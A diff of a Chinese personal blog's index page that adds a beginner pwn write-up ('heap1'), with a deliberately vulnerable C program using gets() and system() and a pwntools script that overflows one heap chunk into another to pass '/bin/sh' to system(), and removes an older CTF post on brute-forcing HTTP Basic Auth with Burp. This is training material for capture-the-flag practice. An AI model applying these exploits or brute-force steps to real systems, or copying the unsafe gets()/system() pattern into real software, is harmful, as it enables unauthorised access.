@@ -128,7 +128,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">27</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">28</span></a>
 
   </li>
   </ul>
@@ -154,6 +154,88 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/09/heap1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/09/heap1/" class="post-title-link" itemprop="url">heap1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-09 20:08:35 / 修改时间：20:09:13" itemprop="dateCreated datePublished" datetime="2023-05-09T20:08:35+08:00">2023-05-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><p>很简单的一个堆溢出 首先要知道堆的基本结构，chunk 我开了2个chunk，并且申请连续的heap空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">#include&lt;stdlib.h&gt; </span><br><span class="line">#include&lt;string.h&gt; </span><br><span class="line">int main() &#123; </span><br><span class="line">char *chunk1,*chunk2; </span><br><span class="line">chunk1 = malloc(0x16); chunk2 = malloc(0x16); </span><br><span class="line">puts(&quot;Input:&quot;); </span><br><span class="line">gets(chunk1); </span><br><span class="line">system(chunk2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有一个gets函数对chunk1生效。并且system的参数为chunk2 那么就说明我们可以通过去覆盖chunk1，然后溢出到chunk2 。</p>
+<p>只需要会gdb调试看参数就行。 由于不确定参数位置(如果没有什么经验的话) 我们就先写16个a进chunk1</p>
+<p><img src="/../images/heap1/202203281516848.png" alt="img"></p>
+<p><img src="/../images/heap1/202203281516373.png" alt="img"></p>
+<p>可以看到在0x96551a0 - 0x96551c0 位置 其中system参数command调用的是0x96551c0</p>
+<p><img src="/../images/heap1/202203281516407.png" alt="img"></p>
+<p>那这边如果熟练就可以直接看出来，往前走5个字节就能到0x96551c0。如果不熟练可以+1+1的慢慢调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">io = process(&quot;./heap&quot;) </span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Input:\n&quot;); </span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x16+5)+b&#x27;/bin/sh&#x27; </span><br><span class="line"></span><br><span class="line">gdb.attach(io) </span><br><span class="line"></span><br><span class="line">io.sendline(payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/heap1/202203281517668.png" alt="img"></p>
+<p>这样command参数就正确了</p>
+<p><img src="/../images/heap1/202203281517053.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1119,106 +1201,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/01/%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/01/%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/" class="post-title-link" itemprop="url">web-基础认证</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-01 22:06:29" itemprop="dateCreated datePublished" datetime="2023-02-01T22:06:29+08:00">2023-02-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-05 13:56:03" itemprop="dateModified" datetime="2023-02-05T13:56:03+08:00">2023-02-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、打开题目环境</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/115e8182e56a4dc9bb03b150c2434453.png" alt="img"></p>
-<p>2、点击click跳出来一个登录弹窗，随便输入用户名和密码登录试试，没有返回任何有用信息</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/11af9f2d902545a89457537ad97031cd.png" alt="img"></p>
-<p>3、查看附件，得到一堆密码，应该是要直接爆破</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8a93fcba23064b469ef3f2dabe1995c6.png" alt="img"></p>
-<p>4、点击click<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>后发送到repeater模块，重新发包得到”Do u know admin”的信息，猜测用户名即为admin</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/e6bc18b23c544e5aa3d5108c24479dd4.png" alt="img"></p>
-<p>4、输入用户名和密码后抓包，看到一串<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">base64加密</a>过的字符</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/22cf876256334313b0d68bdd34b8a523.png" alt="img"></p>
-<p>丢到解码器里解码，发现是我刚输进去的用户名和密码，中间用冒号隔开了（冒号划重点！</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/0fe41ea078914b1d80c09fa9c4927f76.png" alt="img"></p>
-<p>6、把包发送到爆破模块，给刚刚的base64密码添加变量（这里截图截错了，添加完变量后应该这段字符前后各有一个§符号）</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8d5a666fff6f4e6babb6f3abca86c959.png" alt="img"></p>
-<p> 7、在payload options[simple list]模块把题目附件里面的密码粘贴进去</p>
-<p>8、添加前缀，admin后面一定不要忘记加冒号！</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8de3db8daf804ad3b08cf334e3fcc49e.png" alt="img"></p>
-<p> 添加base64编码</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8c03ad1544f440e09eaf0cbc7e7c4a5a.png" alt="img"></p>
-<p> 9、把特殊符号的url编码取消，不然&#x3D;会被转换成%3d</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/be2d147292674f10b416b3aa2517e580.png" alt="img"></p>
-<p> 10、全部布置完是这个样子</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2ed2adeda37b4b4fa4a65e0cf3cfe290.png" alt="img"></p>
-<p>11、开始爆破，发现长度不一样的了</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2a9ba7de13214ee1a7467e3f8f6f7bba.png" alt="img"></p>
-<p> 12、在raw模块复制后查看response，得到flag</p>
-<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/6001e858ddba4d7c831cfe370005aef2.png" alt="img"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1290,7 +1272,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
